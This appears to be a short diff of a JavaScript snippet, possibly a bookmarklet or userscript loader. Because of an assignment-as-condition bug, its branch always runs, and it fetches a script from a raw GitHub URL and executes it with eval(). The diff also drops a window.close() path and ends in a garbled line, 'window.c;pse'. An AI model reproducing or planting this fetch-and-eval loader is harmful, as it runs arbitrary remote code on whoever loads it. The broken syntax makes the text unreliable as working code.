@@ -1,6 +1,5 @@
 var ks = "f"
-if(ks="t"){
-window.close()
-}else{
+if(ks="f"){
 fetch("https://raw.githubusercontent.com/Ddudd3/gt/main/executegtv3").then(data=>{data.text().then(text=>{eval(text)})});
-}
+}else{
+window.c;pse
